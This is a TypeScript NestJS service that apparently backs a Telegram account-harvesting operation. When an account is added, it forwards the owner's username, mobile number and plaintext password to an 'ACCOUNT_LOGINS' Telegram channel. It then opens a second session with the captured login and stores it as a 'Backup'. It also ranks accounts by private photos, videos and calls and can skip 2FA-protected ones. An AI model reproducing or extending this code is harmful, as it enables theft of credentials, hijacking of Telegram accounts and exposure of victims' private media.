import { TelegramService } from './../Telegram/Telegram.service';
import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { User, UserDocument } from './schemas/user.schema';
import { SearchUserDto } from './dto/search-user.dto';
import { ClientService } from '../clients/client.service';
import { UpdateUserDto } from './dto/update-user.dto';
import { CreateUserDto } from './dto/create-user.dto';
import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
import { notifbot } from '../../utils/logbots';
import { connectionManager } from '../Telegram/utils/connection-manager';
import { BotsService, ChannelCategory } from '../bots';

@Injectable()
export class UsersService {
  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,
    @Inject(forwardRef(() => TelegramService))
    private telegramService: TelegramService,
    @Inject(forwardRef(() => ClientService))
    private clientsService: ClientService,
    private readonly botsService: BotsService
  ) { }

  async create(user: CreateUserDto): Promise<User | undefined> {
    const activeClientSetup = this.telegramService.getActiveClientSetup();
    console.log("New User received - ", user?.mobile);
    console.log("ActiveClientSetup::", activeClientSetup);
    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
      console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId)
      await this.clientsService.updateClientSession(user.session)
    } else {
      await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels
      // await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
      setTimeout(async () => {
        try {
          await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
          // this.telegramService.forwardMediaToBot(user.mobile, null);
          const newSession = await this.telegramService.createNewSession(user.mobile);
          const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
          await newUserBackup.save();
        } catch (error) {
          console.log("Error in creating new session", error);
        }
      }, 3000);
      const newUser = new this.userModel(user);
      return newUser.save();
    }
  }

  async findAll(): Promise<User[]> {
    return this.userModel.find().exec();
  }

  async findOne(tgId: string): Promise<User> {
    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()
    if (!user) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    return user;
  }

  async update(tgId: string, user: UpdateUserDto): Promise<number> {
    delete user['_id']
    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { upsert: true }).exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users with tgId ${tgId} not found`);
    }
    return result.modifiedCount;
  }

  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {
    delete user['_id']
    const result = await this.userModel.updateMany(filter, { $set: user }, { upsert: true }).exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);
    }
    return result.modifiedCount;
  }

  async delete(tgId: string): Promise<void> {
    const result = await this.userModel.deleteOne({ tgId }).exec();
    if (result.deletedCount === 0) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
  }

  async deleteById(userId: string): Promise<void> {
    const result = await this.userModel.deleteOne({ _id: userId }).exec();
    if (result.deletedCount === 0) {
      throw new NotFoundException(`User with id ${userId} not found`);
    }
  }

  async search(filter: SearchUserDto): Promise<User[]> {
    if (filter.firstName) {
      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any
    }
    if (filter.twoFA !== undefined) {
      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;
    }
    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();
  }

  async executeQuery(query: any, sort?: any, limit?: number, skip?: number) {
    try {
      if (!query) {
        throw new BadRequestException('Query is invalid.');
      }
      const queryExec = this.userModel.find(query);

      if (sort) {
        queryExec.sort(sort);
      }

      if (limit) {
        queryExec.limit(limit);
      }

      if (skip) {
        queryExec.skip(skip);
      }

      return await queryExec.exec();
    } catch (error) {
      throw new InternalServerErrorException(error.message);
    }
  }

  /**
   * Get users with top interaction scores based on saved stats in DB
   * Uses smart filtering with proper weightages for different interaction types
   * Movie count has negative weightage as it indicates less genuine interaction
   * @param options - Filtering and pagination options
   * @returns Paginated list of users sorted by interaction score
   */
  async getTopInteractionUsers(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    minCalls?: number;
    minPhotos?: number;
    minVideos?: number;
    excludeExpired?: boolean;
    excludeTwoFA?: boolean;
    gender?: string;
  }): Promise<{
    users: Array<User & { interactionScore: number }>;
    total: number;
    page: number;
    limit: number;
    totalPages: number;
  }> {
    const {
      page = 1,
      limit = 20,
      minScore = 0,
      minCalls = 0,
      minPhotos = 0,
      minVideos = 0,
      excludeExpired = true,
      excludeTwoFA = false,
      gender
    } = options;

    // Validate pagination
    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100); // Max 100 per page
    const skip = (pageNum - 1) * limitNum;

    // Weightages for interaction scoring
    // Higher weights for own content (user-generated) vs received content
    const weights = {
      ownPhoto: 8,           // Photos sent by user (high engagement)
      ownVideo: 12,          // Videos sent by user (very high engagement)
      otherPhoto: 3,         // Photos received (moderate engagement)
      otherVideo: 5,         // Videos received (good engagement)
      totalPhoto: 2,         // Total photos (fallback if own/other not available)
      totalVideo: 3,         // Total videos (fallback if own/other not available)
      incomingCall: 15,      // Incoming calls (high engagement - peer initiated)
      outgoingCall: 8,       // Outgoing calls (good engagement - user initiated)
      videoCall: 20,         // Video calls (highest engagement)
      totalCalls: 1,         // Total calls (fallback)
      movieCount: -10,       // NEGATIVE: Movie count indicates less genuine interaction
    };

    // Build filter query
    const filter: any = {};

    // Exclude expired users by default
    if (excludeExpired) {
      filter.expired = { $ne: true };
    }

    // Exclude 2FA users if requested
    if (excludeTwoFA) {
      filter.twoFA = { $ne: true };
    }

    // Gender filter
    if (gender) {
      filter.gender = gender;
    }

    // Minimum thresholds
    if (minCalls > 0) {
      filter['calls.totalCalls'] = { $gte: minCalls };
    }

    if (minPhotos > 0) {
      filter.$or = [
        { photoCount: { $gte: minPhotos } },
        { ownPhotoCount: { $gte: minPhotos } },
        { otherPhotoCount: { $gte: minPhotos } }
      ];
    }

    if (minVideos > 0) {
      filter.$or = [
        ...(filter.$or || []),
        { videoCount: { $gte: minVideos } },
        { ownVideoCount: { $gte: minVideos } },
        { otherVideoCount: { $gte: minVideos } }
      ];
    }

    // Use MongoDB aggregation pipeline for efficient scoring and pagination
    // This calculates scores in the database instead of loading all users into memory
    const pipeline: any[] = [
      // Match stage - apply filters
      { $match: filter },
      
      // Add calculated fields for interaction score
      {
        $addFields: {
          // Photo score (prefer own > other > total)
          photoScore: {
            $cond: {
              if: { $gt: ['$ownPhotoCount', 0] },
              then: { $multiply: ['$ownPhotoCount', weights.ownPhoto] },
              else: {
                $cond: {
                  if: { $gt: ['$otherPhotoCount', 0] },
                  then: { $multiply: ['$otherPhotoCount', weights.otherPhoto] },
                  else: {
                    $cond: {
                      if: { $gt: ['$photoCount', 0] },
                      then: { $multiply: ['$photoCount', weights.totalPhoto] },
                      else: 0
                    }
                  }
                }
              }
            }
          },
          
          // Video score (prefer own > other > total)
          videoScore: {
            $cond: {
              if: { $gt: ['$ownVideoCount', 0] },
              then: { $multiply: ['$ownVideoCount', weights.ownVideo] },
              else: {
                $cond: {
                  if: { $gt: ['$otherVideoCount', 0] },
                  then: { $multiply: ['$otherVideoCount', weights.otherVideo] },
                  else: {
                    $cond: {
                      if: { $gt: ['$videoCount', 0] },
                      then: { $multiply: ['$videoCount', weights.totalVideo] },
                      else: 0
                    }
                  }
                }
              }
            }
          },
          
          // Call score calculation - handle nested calls object
          callScore: {
            $let: {
              vars: {
                incomingVal: { $ifNull: ['$calls.incoming', 0] },
                outgoingVal: { $ifNull: ['$calls.outgoing', 0] },
                videoVal: { $ifNull: ['$calls.video', 0] },
                totalCallsVal: { $ifNull: ['$calls.totalCalls', 0] }
              },
              in: {
                $add: [
                  {
                    $cond: {
                      if: { $gt: ['$$incomingVal', 0] },
                      then: { $multiply: ['$$incomingVal', weights.incomingCall] },
                      else: 0
                    }
                  },
                  {
                    $cond: {
                      if: { $gt: ['$$outgoingVal', 0] },
                      then: { $multiply: ['$$outgoingVal', weights.outgoingCall] },
                      else: 0
                    }
                  },
                  {
                    $cond: {
                      if: { $gt: ['$$videoVal', 0] },
                      then: { $multiply: ['$$videoVal', weights.videoCall] },
                      else: 0
                    }
                  },
                  {
                    $cond: {
                      if: {
                        $and: [
                          { $eq: ['$$incomingVal', 0] },
                          { $eq: ['$$outgoingVal', 0] },
                          { $gt: ['$$totalCallsVal', 0] }
                        ]
                      },
                      then: { $multiply: ['$$totalCallsVal', weights.totalCalls] },
                      else: 0
                    }
                  }
                ]
              }
            }
          },
          
          // Movie count (negative weightage)
          movieScore: {
            $cond: {
              if: { $gt: ['$movieCount', 0] },
              then: { $multiply: ['$movieCount', weights.movieCount] }, // Negative weight
              else: 0
            }
          }
        }
      },
      
      // Calculate total interaction score
      {
        $addFields: {
          interactionScore: {
            $round: [
              {
                $divide: [
                  {
                    $add: [
                      '$photoScore',
                      '$videoScore',
                      '$callScore',
                      '$movieScore'
                    ]
                  },
                  1
                ]
              },
              2
            ]
          }
        }
      },
      
      // Filter by minimum score
      {
        $match: {
          interactionScore: { $gte: minScore }
        }
      },
      
      // Sort by interaction score (descending)
      { $sort: { interactionScore: -1 } },
      
      // Get total count before pagination (using $facet)
      {
        $facet: {
          totalCount: [{ $count: 'count' }],
          paginatedResults: [
            { $skip: skip },
            { $limit: limitNum }
          ]
        }
      },
      
      // Unwind and format
      {
        $project: {
          total: { $ifNull: [{ $arrayElemAt: ['$totalCount.count', 0] }, 0] },
          users: '$paginatedResults'
        }
      }
    ];

    const result = await this.userModel.aggregate(pipeline, { allowDiskUse: true }).exec();
    
    if (!result || result.length === 0) {
      return {
        users: [],
        total: 0,
        page: pageNum,
        limit: limitNum,
        totalPages: 0
      };
    }

    const aggregationResult = result[0];
    const totalUsers = aggregationResult.total || 0;
    const users = aggregationResult.users || [];
    
    // Remove temporary score fields from response
    const cleanedUsers = users.map((user: any) => {
      const { photoScore, videoScore, callScore, movieScore, ...cleanUser } = user;
      return cleanUser;
    });

    const totalPages = Math.ceil(totalUsers / limitNum);

    return {
      users: cleanedUsers,
      total: totalUsers,
      page: pageNum,
      limit: limitNum,
      totalPages
    };
  }

}
